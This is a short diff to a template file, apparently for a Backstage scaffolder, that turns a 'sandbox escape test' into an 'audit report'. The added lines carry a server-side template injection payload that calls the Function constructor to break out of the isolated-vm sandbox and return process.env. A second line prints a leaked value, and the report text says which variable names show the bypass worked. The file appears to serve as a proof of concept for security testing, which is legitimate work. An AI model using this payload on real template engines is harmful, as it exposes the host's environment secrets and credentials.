@@ -1,3 +1,15 @@
---- SANDBOX ESCAPE TEST ---
-If the exploit worked, your secrets are below:
+--- BACKSTAGE SANDBOX AUDIT REPORT ---
+Generated at: {{ 'now' | date }}
+
+[TESTING FOR SSTI / SANDBOX ESCAPE]
+The payload was: {{ [].constructor.constructor('return process.env')() }}
+
+[RESULTS]
+If the line below contains "USERDOMAIN", "PATH", or "NODE_VERSION", 
+the isolated-vm sandbox has been BYPASSED.
+
+DUMP:
 {{ values.leak }}
+
+---------------------------------------
+END OF REPORT
